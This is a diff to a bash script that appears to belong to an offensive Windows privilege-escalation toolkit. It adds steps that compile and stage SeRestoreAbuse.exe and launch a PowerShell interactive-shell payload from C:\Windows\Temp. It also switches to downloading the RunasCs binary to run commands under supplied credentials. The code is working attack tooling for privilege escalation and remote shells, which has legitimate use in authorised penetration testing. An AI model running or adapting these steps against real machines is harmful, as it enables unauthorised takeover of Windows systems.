@@ -302,6 +302,14 @@ create_se_restore_abuse() {
     cp "$SCRIPTDIR/../c/SeRestoreAbuse.cpp" .
     x86_64-w64-mingw32-gcc -o SeRestoreAbuse.exe SeRestoreAbuse.cpp -lstdc++ -static
     generate_windows_download "SeRestoreAbuse.exe"
+    if [[ -z $cmd ]]; then
+        cmd=$(get_powershell_interactive_shell)
+    fi
+    if [[ -z $temp_dir ]]; then
+        temp_dir="C:\\Windows\\Temp"
+    fi
+    create_run_windows_exe
+    echo ".\\SeRestoreAbuse.exe $temp_dir\\run_windows.exe"
 }
 
 create_restart_windows() {
@@ -385,19 +393,22 @@ netuser_change_user_password() {
 }
 
 download_runas() {
-    local url="https://github.com/antonioCoco/RunasCs/archive/refs/heads/master.zip"
+    local url="https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip"
     if [[ ! -d runascs ]]; then
-        echo "Downloading RunasCs tool."
+        mkdir runascs
+    fi
+    pushd runascs || return 1
+    echo "Downloading RunasCs tool."
+    if [[ ! -f "RunasCs.exe" ]]; then
         wget "$url" -O runascs.zip >> $trail_log
         unzip runascs.zip >> $trail_log
-        mv RunasCs-master runascs
     fi
     if [[ -z $username ]]; then
-        echo "Username is required for Invoke-RunasCs."
+        echo "Username is required for RunasCs."
         return 1
     fi
     if [[ -z $password ]]; then
-        echo "Password is required for Invoke-RunasCs."
+        echo "Password is required for RunasCs."
         return 1
     fi
     echo 'cd C:\windows\temp;'
@@ -406,9 +417,9 @@ download_runas() {
         create_run_windows_exe
         cmd="c:\\windows\\temp\\run_windows.exe"
     fi
-    generate_windows_download "runascs/Invoke-RunasCs.ps1" "Invoke-RunAsCs.ps1"
-    echo '. ./Invoke-RunasCs.ps1;'
-    echo "Invoke-RunasCs $username $password \"$cmd\";"
+    popd || return 1
+    generate_windows_download "runascs/RunasCs.exe" "RunasCs.exe"
+    echo "RunasCs.exe $username $password \"$cmd\";"
 }
 
 perform_semanagevolume_exploit() {
